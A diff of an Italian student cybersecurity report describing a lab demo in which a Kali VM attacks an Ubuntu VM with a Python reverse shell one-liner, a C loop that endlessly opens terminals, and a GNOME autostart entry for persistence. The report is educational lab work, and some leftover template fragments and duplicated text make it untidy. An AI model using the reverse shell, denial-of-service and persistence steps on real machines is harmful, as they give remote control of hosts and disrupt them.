@@ -1,24 +1,49 @@
 # Cybersecurity report Huseinovic Elma
 
-## Reverse shell and Denial of service on a Ubuntu virtual machine
+## Reverse shell and Denial of service with persistence on an Ubuntu virtual machine
 
-## Introduction
+# Introduction
 
 L'obiettivo della demo è di creare un Denial of Service persistente su una macchina virtuale Ubuntu, che quindi sarà la macchina attaccata, mentre per l'attaccante è stata utilizzata una macchina virtuale Kali.
 
-## Reverse shell
+## Preparazione Kali
+Per prima cosa sono stati creati tutti i file necessari su Kali.
+Per primo il file `reverseshell.sh`, dove è presente il [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python 
+<pre>
+export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+</pre>
+che permette di creare la reverse shell quando eseguito sulla macchina attaccata.
+Poi, è stato creato un semplicissimo programma in C, `dos.c`, contenente un ciclo while infinito che continua ad aprire finestre di terminale:
+<pre>
+#include <stdlib.h>
+int main(){
+    while(1){
+        system("gnome-terminal");
+    }
+    return 0;
+}
+</pre>
+è stato scelto di aprire il terminale per semplicità, è possibile farlo con altre applicazioni e anche aprirne diverse, creando un vero e proprio crash della macchina. 
+Infine è stato creato il file `dos.desktop` 
+<pre>
+[Desktop Entry]                  
+Type=Application                
+Exec=/home/ubuntu/dos            
+Hidden=false                     
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[en_US]=dos
+Name=dos
+Comment[eu_US]=
+Comment=
+</pre>
+che verrà utilizzato per inserire il programma che esegue il Denial of Service tra le applicazioni che si aprono all'avvio della macchina. 
+Una volta creati i file, è stata creato anche un web file server sulla porta 80, utilizzando il comando `python -m http.server 80`
 
-Per fare il Denial of service, per prima cosa è stata creata una reverse shell, in modo che dalla macchina Kali si potessero eseguire comandi sulla macchina ubuntu. Per fare ciò è stato utilizzado un [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl) in python, è stato creato un file, chiamato reverseshell.sh.
+Per fare il Denial of service, per prima cosa è stata creata una reverse shell, in modo che dalla macchina Kali si potessero eseguire comandi sulla macchina ubuntu. Per fare ciò è stato utilizzado un [payload](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#p erl) in python, è stato creato un file, chiamato reverseshell.sh.
 Preparazione Kali: utilizzando il comando `python -m http.server 80` è stato creato un web file server sulla porta 80. 
-![Web File Server](images/webfileserver.png)
+![Web File Server](images/webfileserver2.png)
 
-
-
-
-[Docsify](https://docsify.js.org/#/) 
-nerate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
-
-## Introduction
 
 **Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
 
